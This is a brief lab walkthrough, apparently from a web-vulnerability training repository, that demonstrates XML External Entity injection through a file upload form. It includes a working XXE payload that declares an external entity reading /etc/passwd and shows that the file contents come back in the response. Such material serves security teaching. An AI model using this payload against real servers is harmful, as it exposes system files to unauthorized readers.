# XXE - External Entities Injection

- We have got a file upload feature.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/535cac51-9049-459b-9050-a63d4a984df1)

- make a file with a username and password in the form of an XML file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<creds>
    <user>testuser</user>
    <password>testpass</password>
</creds>
```
- while uploading the file we got the username and password.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/12ebc9c5-12a4-4cb5-a0e2-8bbc9026cbad)

- Now, we will parse an XML file which will return us the passwd file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```
- On uploading the file we got data of the passwd file back.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/ddedf793-91a2-409d-a5e8-5a1e92e03612)

- To view it more neatly, we will switch to the view source by using ctrl+U.

![image](https://github.com/thesinghsec/WebVulnLab/assets/126919241/6795fc3f-2137-4bc3-aa9c-db206c930f11)
